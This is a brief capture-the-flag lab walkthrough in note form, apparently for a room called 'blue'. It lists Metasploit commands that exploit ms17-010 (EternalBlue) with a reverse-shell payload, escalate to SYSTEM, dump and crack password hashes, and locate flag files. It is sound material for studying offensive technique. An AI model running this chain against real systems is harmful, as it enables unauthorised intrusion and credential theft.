# set up
- mkdir blue
- subl blue notes
  - export IP={vic ip}

# Recon
- nmap -sC -sV -oN ~/blue/initial_nmap $IP -vv
- exploit - SMBv2 - Shodowbox - ms17-010

# Access
- msfconsole
  - search ms17-010
  - exploit/windows/smb/ms17_010_eternalblue
  - set RHOSTS
  - set payload windows/x64/shell/reverse_tcp

  - Bckground shell (ctrl + Z)

# Escalate
- run post/multi/manage/shell_to_meterpreter
- use multi/manage/shell_to_meterpreter
- set session {session id}
- sessions {session_#}

- getsystem - verify escalation
- ps - identify running processes
- migrate to a NT Authority\system
- migrate PROCESS_ID

# Crack
- hashdump
  - copy hashes to Blue_notes
  - create jon_hash...etc
  - john the ripper - crack the hashes

# Flags in key locations
- 1st flag - C:/
- 2nd flag - Windows
- 3rd flag - jon/documents

- I used the meterpreter to move between folders, but used power shell to locate the flags
- dir *flag*.* /s

